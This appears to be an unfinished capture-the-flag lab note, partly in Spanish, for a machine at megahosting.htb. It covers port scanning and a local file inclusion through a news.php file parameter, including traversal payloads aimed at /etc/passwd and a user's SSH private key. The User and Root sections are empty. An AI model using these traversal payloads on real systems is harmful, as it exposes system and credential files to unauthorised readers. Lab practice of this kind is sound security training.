## Summary

Tags: #Linux #Tomcat #DirectoryPathTraversal #Msfvenom 

- IP -> 10.10.10.194
- Ports -> TCP (22, 80, 8080), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 8.2p1
    - 80 -> Apache httpd 2.4.41
    - 8080 -> Apache Tomcat 

## Launchpad

-   [Launchpad](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts 

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

```bash
❯ whatweb ❮http://❮IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash 
# En el puerto 80 de la pagina encontramos en la web una pestaña llamada "NEWS", la cual no podemos ingresar porque se esta aplicando virtual hosting. Por lo que debemos de agregar el dominio a nuestro '/etc/hosts' 

# Dentro de NEWS observamos lo siguiente en la url:

❯ megahosting.htb/news.php?file=statement

# Ahi podemos observar que hay un '?file=' que nos puede llevar a un LFI (Local File Inclusion), por lo que probamos lo siguiente en la URL:

❯ megahosting.htb/news.php?file=/../../../../../etc/passwd       # Hacemos un Directory Path Traversal para ver el /etc/host de la maquina victima

# Miramos el resultado desde el codigo de la pagina con 'Ctrl + u'

# Podemos observar dos usuarios, el primero es 'root' y el segundo 'ash', por lo que nos disponemos a ver si podemos ver mas cosas como:

❯ megahosting.htb/news.php?file=/../../../../../home/ash/user.txt
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/id_rsa
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/authorized_keys
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/id_rsa.pub

# Pero no podemos mirar nada de los comandos anteriores ya que existe una restriccion.
```

## User


## Root